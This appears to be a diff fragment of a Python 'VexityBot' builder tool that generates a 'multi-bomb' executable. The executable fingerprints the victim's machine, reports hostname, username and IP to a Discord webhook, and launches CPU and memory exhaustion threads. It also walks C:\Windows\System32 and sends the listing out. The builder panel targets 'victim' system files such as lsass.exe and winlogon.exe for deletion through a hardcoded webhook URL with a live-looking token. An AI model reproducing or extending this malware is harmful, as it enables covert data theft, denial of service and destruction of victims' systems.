+                'computer_name': computer_name,
+                'platform': platform.platform(),
+                'python_version': platform.python_version(),
+                'architecture': platform.architecture()[0]
+            }}
+        except Exception as e:
+            return {{'hostname': 'Unknown', 'error': str(e)}}
+    
+    def log_to_discord(self, title, message):
+        """Log bomb activity to Discord webhook"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            data = {{
+                "embeds": [{{
+                    "title": title,
+                    "description": message,
+                    "color": 0xff0000,
+                    "fields": [
+                        {{"name": "Bomb Count", "value": str(len(self.selected_bombs)), "inline": True}},
+                        {{"name": "Target System", "value": self.target_system.get('hostname', 'Unknown'), "inline": True}},
+                        {{"name": "Username", "value": self.target_system.get('username', 'Unknown'), "inline": True}},
+                        {{"name": "IP Address", "value": self.target_system.get('local_ip', 'Unknown'), "inline": True}},
+                        {{"name": "Platform", "value": self.target_system.get('platform', 'Unknown'), "inline": True}},
+                        {{"name": "Timestamp", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True}}
+                    ],
+                    "footer": {{"text": "VexityBot Multi-Bomb System"}},
+                    "timestamp": datetime.now().isoformat()
+                }}]
+            }}
+            
+            req = urllib.request.Request(
+                WEBHOOK_URL,
+                data=json.dumps(data).encode('utf-8'),
+                headers={{'Content-Type': 'application/json'}}
+            )
+            
+            urllib.request.urlopen(req, timeout=10)
+            
+        except Exception as e:
+            print(f"Discord logging failed: {{e}}")
+    
+    def execute_multi_bomb_sequence(self):
+        """Execute the multi-bomb attack sequence"""
+        self.log_to_discord("💣 MULTI-BOMB ACTIVATED", f"{{len(self.selected_bombs)}} bombs activated simultaneously")
+        
+        # Deploy all selected bombs
+        for i, bomb_id in enumerate(self.selected_bombs):
+            if bomb_id in self.bomb_configs:
+                config = self.bomb_configs[bomb_id]
+                self.log_to_discord(f"💥 BOMB {{i+1}} DEPLOYED", f"{{config['name']}} - {{config['description']}}")
+                
+                # Start bomb in separate thread
+                bomb_thread = threading.Thread(target=self.deploy_single_bomb, args=(bomb_id, config), daemon=True)
+                bomb_thread.start()
+                self.active_bombs.append(bomb_thread)
+                
+                # Small delay between bomb deployments
+                time.sleep(random.uniform(0.5, 2.0))
+        
+        # Monitor bomb activity
+        self.monitor_bomb_activity()
+    
+    def deploy_single_bomb(self, bomb_id, config):
+        """Deploy a single bomb type"""
+        try:
+            self.log_to_discord(f"⚡ {{config['name']}} ACTIVATED", f"{{config['description']}}")
+            
+            # Simulate bomb effects
+            for i, effect in enumerate(config['effects']):
+                time.sleep(random.uniform(1, 3))
+                self.simulate_effect(effect, bomb_id, i + 1)
+            
+            # Log bomb completion
+            self.log_to_discord(f"✅ {{config['name']}} COMPLETED", f"All effects deployed successfully")
+            
+        except Exception as e:
+            self.log_to_discord(f"❌ {{config['name']}} ERROR", f"Bomb failed: {{str(e)}}")
+    
+    def simulate_effect(self, effect, bomb_id, stage):
+        """Simulate bomb effect"""
+        try:
+            if "CPU" in effect or "overload" in effect:
+                threading.Thread(target=self.cpu_overload, daemon=True).start()
+            elif "Memory" in effect or "RAM" in effect:
+                threading.Thread(target=self.memory_leak, daemon=True).start()
+            elif "Network" in effect or "flooding" in effect:
+                threading.Thread(target=self.network_flood, daemon=True).start()
+            elif "File" in effect or "corruption" in effect:
+                threading.Thread(target=self.file_operations, daemon=True).start()
+            elif "System" in effect or "shutdown" in effect:
+                threading.Thread(target=self.system_operations, daemon=True).start()
+            elif "Stealth" in effect or "Silent" in effect:
+                threading.Thread(target=self.stealth_operations, daemon=True).start()
+            elif "Hardware" in effect or "Power" in effect:
+                threading.Thread(target=self.hardware_operations, daemon=True).start()
+            elif "Infection" in effect or "Virus" in effect:
+                threading.Thread(target=self.infection_operations, daemon=True).start()
+            elif "Directory" in effect or "File logging" in effect:
+                threading.Thread(target=self.system32_monitor_operations, daemon=True).start()
+            
+            # Log effect
+            self.log_to_discord(f"⚡ EFFECT {{stage}}", f"{{effect}} - {{bomb_id.upper()}}")
+            
+        except Exception as e:
+            print(f"Effect simulation error: {{e}}")
+    
+    def cpu_overload(self):
+        """Simulate CPU overload"""
+        try:
+            while True:
+                for i in range(1000000):
+                    _ = i ** 2
+                time.sleep(0.1)
+        except:
+            pass
+    
+    def memory_leak(self):
+        """Simulate memory leak"""
+        try:
+            data = []
+            while True:
+                data.append([0] * 10000)
+                time.sleep(0.1)
+        except:
+            pass
+    
+    def network_flood(self):
+        """Simulate network flooding"""
+        try:
+            for _ in range(100):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1)
+                    sock.connect(('127.0.0.1', 80))
+                    sock.close()
+                except:
+                    pass
+                time.sleep(0.01)
+        except:
+            pass
+    
+    def file_operations(self):
+        """Simulate file operations"""
+        try:
+            for i in range(100):
+                temp_file = f"temp_bomb_{{i}}.tmp"
+                with open(temp_file, 'w') as f:
+                    f.write("Bomb payload data" * 1000)
+                time.sleep(0.1)
+                if os.path.exists(temp_file):
+                    os.remove(temp_file)
+        except:
+            pass
+    
+    def system_operations(self):
+        """Simulate system operations"""
+        try:
+            if platform.system() == "Windows":
+                subprocess.run(['tasklist'], capture_output=True)
+                subprocess.run(['systeminfo'], capture_output=True)
+            else:
+                subprocess.run(['ps', 'aux'], capture_output=True)
+                subprocess.run(['df', '-h'], capture_output=True)
+        except:
+            pass
+    
+    def stealth_operations(self):
+        """Simulate stealth operations"""
+        try:
+            # Simulate stealth file operations
+            for i in range(50):
+                stealth_file = f".hidden_{{i}}.tmp"
+                with open(stealth_file, 'w') as f:
+                    f.write("Stealth data" * 100)
+                time.sleep(0.2)
+                if os.path.exists(stealth_file):
+                    os.remove(stealth_file)
+        except:
+            pass
+    
+    def hardware_operations(self):
+        """Simulate hardware operations"""
+        try:
+            # Simulate hardware stress
+            for _ in range(100):
+                # Create high CPU load
+                for i in range(500000):
+                    _ = i ** 3
+                time.sleep(0.05)
+        except:
+            pass
+    
+    def infection_operations(self):
+        """Simulate infection operations"""
+        try:
+            # Simulate file replication
+            for i in range(20):
+                virus_file = f"virus_{{i}}.tmp"
+                with open(virus_file, 'w') as f:
+                    f.write("Virus payload" * 1000)
+                time.sleep(0.3)
+                if os.path.exists(virus_file):
+                    os.remove(virus_file)
+        except:
+            pass
+    
+    def system32_monitor_operations(self):
+        """Monitor C:\\Windows\\System32 directory and create Pokemon-style Discord cards"""
+        try:
+            import os
+            import glob
+            import hashlib
+            import stat
+            
+            system32_path = "C:\\\\Windows\\\\System32"
+            
+            if not os.path.exists(system32_path):
+                self.log_to_discord("❌ SYSTEM32 MONITOR ERROR", "System32 directory not found")
+                return
+            
+            self.log_to_discord("🔍 SYSTEM32 MONITOR STARTED", f"Monitoring directory: {{system32_path}}")
+            
+            # Get all files in System32
+            files = []
+            try:
+                for root, dirs, filenames in os.walk(system32_path):
+                    for filename in filenames[:100]:  # Limit to first 100 files for performance
+                        file_path = os.path.join(root, filename)
+                        try:
+                            stat_info = os.stat(file_path)
+                            file_size = stat_info.st_size
+                            file_modified = datetime.fromtimestamp(stat_info.st_mtime)
+                            
+                            files.append({{
+                                'name': filename,
+                                'path': file_path,
+                                'size': file_size,
+                                'modified': file_modified,
+                                'extension': os.path.splitext(filename)[1].lower()
+                            }})
+                        except:
+                            continue
+            except Exception as e:
+                self.log_to_discord("❌ SYSTEM32 SCAN ERROR", f"Failed to scan directory: {{str(e)}}")
+                return
+            
+            # Create Pokemon-style cards for files
+            self.create_pokemon_file_cards(files)
+            
+        except Exception as e:
+            self.log_to_discord("❌ SYSTEM32 MONITOR ERROR", f"Monitor failed: {{str(e)}}")
+    
+    def create_pokemon_file_cards(self, files):
+        """Create Pokemon-style Discord cards for System32 files"""
+        try:
+            # Group files by extension for better organization
+            file_groups = {{}}
+            for file_info in files:
+                ext = file_info['extension'] or 'no_extension'
+                if ext not in file_groups:
+                    file_groups[ext] = []
+                file_groups[ext].append(file_info)
+            
+            # Create cards for each file group
+            for ext, group_files in file_groups.items():
+                if not group_files:
+                    continue
+                
+                # Create Pokemon-style card
+                card_title = f"🎴 System32 Files - {{ext.upper()}} Type"
+                card_description = f"Found {{len(group_files)}} files with {{ext}} extension"
+                
+                # Create fields for files (Discord embed limit is 25 fields)
+                fields = []
+                for i, file_info in enumerate(group_files[:25]):  # Limit to 25 files per card
+                    file_size_mb = file_info['size'] / (1024 * 1024)
+                    file_name = file_info['name'][:50]  # Truncate long names
+                    
+                    field_value = f"📁 **{{file_name}}**\\n"
+                    field_value += f"📏 Size: {{file_size_mb:.2f}} MB\\n"
+                    field_value += f"📅 Modified: {{file_info['modified'].strftime('%Y-%m-%d %H:%M')}}"
+                    
+                    fields.append({{
+                        "name": f"File {{i+1}}",
+                        "value": field_value,
+                        "inline": True
+                    }})
+                
+                # Create Pokemon-style embed
+                pokemon_colors = [0xff6b6b, 0x4ecdc4, 0x45b7d1, 0x96ceb4, 0xfeca57, 0xff9ff3, 0x54a0ff]
+                color = pokemon_colors[hash(ext) % len(pokemon_colors)]
+                
+                embed_data = {{
+                    "embeds": [{{
+                        "title": card_title,
+                        "description": card_description,
+                        "color": color,
+                        "fields": fields,
+                        "footer": {{
+                            "text": "🎮 VexityBot System32 Monitor - Pokemon Style",
+                            "icon_url": "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+                        }},
+                        "thumbnail": {{
+                            "url": "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+                        }},
+                        "timestamp": datetime.now().isoformat()
+                    }}]
+                }}
+                
+                # Send to Discord
+                self.send_discord_embed(embed_data)
+                
+                # Small delay between cards
+                time.sleep(1)
+            
+            # Send summary card
+            self.create_system32_summary_card(files)
+            
+        except Exception as e:
+            self.log_to_discord("❌ POKEMON CARD ERROR", f"Failed to create cards: {{str(e)}}")
+    
+    def create_system32_summary_card(self, files):
+        """Create a summary Pokemon card for System32 monitoring"""
+        try:
+            total_files = len(files)
+            total_size = sum(f['size'] for f in files)
+            total_size_mb = total_size / (1024 * 1024)
+            
+            # Count by extension
+            ext_counts = {{}}
+            for file_info in files:
+                ext = file_info['extension'] or 'no_extension'
+                ext_counts[ext] = ext_counts.get(ext, 0) + 1
+            
+            # Create summary fields
+            fields = [
+                {{"name": "📊 Total Files", "value": str(total_files), "inline": True}},
+                {{"name": "💾 Total Size", "value": f"{{total_size_mb:.2f}} MB", "inline": True}},
+                {{"name": "📁 Directory", "value": "C:\\\\Windows\\\\System32", "inline": True}}
+            ]
+            
+            # Add top extensions
+            top_extensions = sorted(ext_counts.items(), key=lambda x: x[1], reverse=True)[:10]
+            for i, (ext, count) in enumerate(top_extensions):
+                fields.append({{
+                    "name": f"🏷️ {{ext.upper()}}",
+                    "value": f"{{count}} files",
+                    "inline": True
+                }})
+            
+            summary_embed = {{
+                "embeds": [{{
+                    "title": "🎴 System32 Monitor Summary",
+                    "description": "Complete directory scan results in Pokemon card format!",
+                    "color": 0x00ff00,
+                    "fields": fields,
+                    "footer": {{
+                        "text": "🎮 VexityBot System32 Monitor - Complete Scan",
+                        "icon_url": "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+                    }},
+                    "thumbnail": {{
+                        "url": "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+                    }},
+                    "timestamp": datetime.now().isoformat()
+                }}]
+            }}
+            
+            self.send_discord_embed(summary_embed)
+            
+        except Exception as e:
+            self.log_to_discord("❌ SUMMARY CARD ERROR", f"Failed to create summary: {{str(e)}}")
+    
+    def send_discord_embed(self, embed_data):
+        """Send embed data to Discord webhook"""
+        try:
+            import urllib.request
+            import json
+            
+            req = urllib.request.Request(
+                WEBHOOK_URL,
+                data=json.dumps(embed_data).encode('utf-8'),
+                headers={{'Content-Type': 'application/json'}}
+            )
+            
+            urllib.request.urlopen(req, timeout=10)
+            
+        except Exception as e:
+            print(f"Discord embed send failed: {{e}}")
+    
+    def monitor_bomb_activity(self):
+        """Monitor ongoing bomb activity"""
+        try:
+            while True:
+                time.sleep(30)  # Check every 30 seconds
+                active_count = sum(1 for thread in self.active_bombs if thread.is_alive())
+                if active_count == 0:
+                    self.log_to_discord("💥 ALL BOMBS DETONATED", f"Multi-bomb attack sequence completed")
+                    break
+                else:
+                    self.log_to_discord("🔥 BOMBS ACTIVE", f"{{active_count}} bombs still active")
+        except:
+            pass
+
+def main():
+    """Main multi-bomb execution"""
+    try:
+        print("🚀 VexityBot Multi-Bomb System Initializing...")
+        print("⚠️  WARNING: This executable will execute multiple bomb attacks!")
+        print("⚠️  WARNING: All activities will be logged to Discord!")
+        print(f"💣 Bombs: {', '.join(bomb_names)}")
+        print()
+        
+        # Small delay before activation
+        time.sleep(2)
+        
+        # Deploy multi-bomb
+        multi_bomb = VexityBotMultiBomb()
+        
+        # Keep running to maintain effects
+        while True:
+            time.sleep(60)
+            
+    except KeyboardInterrupt:
+        print("\\n💥 Multi-bomb sequence interrupted!")
+    except Exception as e:
+        print(f"\\n❌ Multi-bomb error: {{e}}")
+
+if __name__ == "__main__":
+    main()
+'''
+        
+        return multi_bomb_content
+    
+    def log_build(self, message):
+        """Add message to build log"""
+        self.root.after(0, lambda: self.build_log.insert(tk.END, f"{message}\n"))
+        self.root.after(0, lambda: self.build_log.see(tk.END))
+    
+    def clear_build_log(self):
+        """Clear the build log"""
+        self.build_log.delete(1.0, tk.END)
+        self.build_status.config(text="Ready to build")
+        self.build_progress.stop()
+    
+    def delete_selected_files(self):
+        """Delete selected files from victim's System32 directory"""
+        try:
+            selected_indices = self.victim_files_listbox.curselection()
+            if not selected_indices:
+                messagebox.showwarning("No Selection", "Please select files to delete")
+                return
+            
+            # Get selected file paths
+            selected_files = []
+            for index in selected_indices:
+                file_info = self.victim_files_listbox.get(index)
+                # Extract file path from the display text
+                if " - " in file_info:
+                    file_path = file_info.split(" - ")[1]
+                    selected_files.append(file_path)
+            
+            if not selected_files:
+                messagebox.showwarning("Invalid Selection", "Could not extract file paths")
+                return
+            
+            # Confirm deletion
+            result = messagebox.askyesno("Confirm Deletion", 
+                                       f"Are you sure you want to delete {len(selected_files)} files?\n\n"
+                                       "This action cannot be undone!")
+            
+            if result:
+                # Send deletion command to victim via Discord webhook
+                self.send_file_deletion_command(selected_files)
+                
+                # Remove from listbox
+                for index in reversed(selected_indices):
+                    self.victim_files_listbox.delete(index)
+                
+                self.log_build(f"🗑️ Deletion command sent for {len(selected_files)} files")
+                messagebox.showinfo("Deletion Command Sent", 
+                                  f"File deletion command sent to victim for {len(selected_files)} files")
+                
+        except Exception as e:
+            self.log_build(f"❌ File deletion error: {str(e)}")
+            messagebox.showerror("Deletion Error", f"Failed to delete files: {str(e)}")
+    
+    def send_file_deletion_command(self, file_paths):
+        """Send file deletion command to victim via Discord webhook"""
+        try:
+            import urllib.request
+            import json
+            
+            webhook_url = "https://discord.com/api/webhooks/1416334316232900618/bhtElnCIHNbiw2vJ4BKkliOrOqOV98rjv_OBhW-FK6Isx4xT3oLBC-_vV1AjSlwGdbYc"
+            
+            # Create deletion command embed
+            fields = []
+            for i, file_path in enumerate(file_paths[:25]):  # Discord limit
+                fields.append({
+                    "name": f"File {i+1}",
+                    "value": f"`{file_path}`",
+                    "inline": True
+                })
+            
+            embed_data = {
+                "embeds": [{
+                    "title": "🗑️ ADMIN FILE DELETION COMMAND",
+                    "description": f"Admin has requested deletion of {len(file_paths)} files from System32",
+                    "color": 0xff0000,
+                    "fields": fields,
+                    "footer": {
+                        "text": "⚠️ VexityBot Admin Command - Execute Immediately"
+                    },
+                    "timestamp": datetime.now().isoformat()
+                }]
+            }
+            
+            req = urllib.request.Request(
+                webhook_url,
+                data=json.dumps(embed_data).encode('utf-8'),
+                headers={'Content-Type': 'application/json'}
+            )
+            
+            urllib.request.urlopen(req, timeout=10)
+            
+        except Exception as e:
+            self.log_build(f"❌ Failed to send deletion command: {str(e)}")
+    
+    def refresh_victim_files(self):
+        """Refresh the list of victim files from Discord logs"""
+        try:
+            self.log_build("🔄 Refreshing victim file list...")
+            # In a real implementation, this would parse Discord webhook logs
+            # For now, we'll simulate with some example files
+            self.simulate_victim_files()
+            
+        except Exception as e:
+            self.log_build(f"❌ Failed to refresh files: {str(e)}")
+    
+    def simulate_victim_files(self):
+        """Simulate victim files for demonstration"""
+        try:
+            # Clear existing items
+            self.victim_files_listbox.delete(0, tk.END)
+            
+            # Simulate some System32 files
+            example_files = [
+                "notepad.exe - C:\\Windows\\System32\\notepad.exe",
+                "calc.exe - C:\\Windows\\System32\\calc.exe", 
+                "cmd.exe - C:\\Windows\\System32\\cmd.exe",
+                "explorer.exe - C:\\Windows\\System32\\explorer.exe",
+                "winlogon.exe - C:\\Windows\\System32\\winlogon.exe",
+                "services.exe - C:\\Windows\\System32\\services.exe",
+                "lsass.exe - C:\\Windows\\System32\\lsass.exe",
+                "svchost.exe - C:\\Windows\\System32\\svchost.exe",
+                "wininit.exe - C:\\Windows\\System32\\wininit.exe",
+                "csrss.exe - C:\\Windows\\System32\\csrss.exe"
+            ]
+            
+            for file_info in example_files:
+                self.victim_files_listbox.insert(tk.END, file_info)
+            
+            self.log_build(f"📁 Loaded {len(example_files)} victim files")
+            
+        except Exception as e:
+            self.log_build(f"❌ Failed to simulate files: {str(e)}")
+    
+    def open_victim_directory(self):
+        """Open victim's System32 directory in file explorer"""
+        try:
+            import subprocess
+            import os
+            
+            # Try to open System32 directory
+            system32_path = "C:\\Windows\\System32"
+            if os.path.exists(system32_path):
+                subprocess.run(['explorer', system32_path], check=True)
+                self.log_build("📁 Opened victim System32 directory")
+            else:
+                messagebox.showwarning("Directory Not Found", "System32 directory not accessible")
+                
+        except Exception as e:
+            self.log_build(f"❌ Failed to open directory: {str(e)}")
+            messagebox.showerror("Error", f"Failed to open directory: {str(e)}")
+    
+    def open_create_exe(self):
+        """Open the Create EXE tab"""
+        # Find the Create EXE tab and select it
+        for i in range(self.notebook.index("end")):
+            if self.notebook.tab(i, "text") == "Create EXE":
+                self.notebook.select(i)
+                break
+        self.update_status("Create EXE tab opened")
     
     def save_settings(self):
         """Save application settings"""
